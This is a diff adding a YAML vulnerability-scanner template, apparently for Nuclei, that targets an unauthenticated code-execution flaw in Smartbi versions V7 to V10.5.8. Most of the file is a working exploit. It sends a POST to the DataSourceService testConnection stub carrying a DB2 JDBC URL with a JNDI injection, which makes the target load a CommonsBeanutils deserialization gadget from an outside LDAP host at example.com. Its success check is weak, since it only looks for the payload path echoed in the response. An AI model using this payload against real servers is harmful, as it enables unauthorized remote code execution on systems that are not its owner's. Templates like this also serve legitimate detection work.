@@ -1,0 +1,50 @@
+id: smartbi-db2-jdbc-rce
+info:
+  name: Smartbi DB2 JDBC Arbitrary Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Smartbi versions V7 to V10.5.8 are vulnerable to an unauthorized access
+    background interface issue, allowing arbitrary code execution via DB2 JDBC exploitation.
+  reference:
+    - https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+variables:
+  ldap_url: "ldap://example.com:1389/Deserialization/CommonsBeanutils1/TomcatEcho"
+http:
+  - raw:
+      - |
+        GET /vision/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status: [404]
+    extractors:
+      - type: regex
+        name: path_check
+        part: body
+        regex:
+          - "smartbi"
+        internal: true
+  - raw:
+      - |
+        GET /smartbi/vision/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status: [200]
+  - raw:
+      - |
+        POST /smartbi/vision/.stub?className=DataSourceService&methodName=testConnection&params=%5B%7B%22driverType%22%3A%22aaa%22%2C%22driver%22%3A%22com.ibm.db2.jcc.DB2Driver%22%2C%22maxConnection%22%3A1%2C%22transactionIsolation%22%3A1%2C%22validationQueryMethod%22%3A3%2C%22url%22%3A%22jdbc%3Adb2%3A%2F%2F127.0.0.1%3A18080%2Fa%3AclientRerouteServerListJNDIName%3D{{ldap_url}}%22%7D%5D HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status: [200]
+    extractors:
+      - type: regex
+        name: rce_success
+        part: body
+        regex:
+          - "Deserialization/CommonsBeanutils1/TomcatEcho"
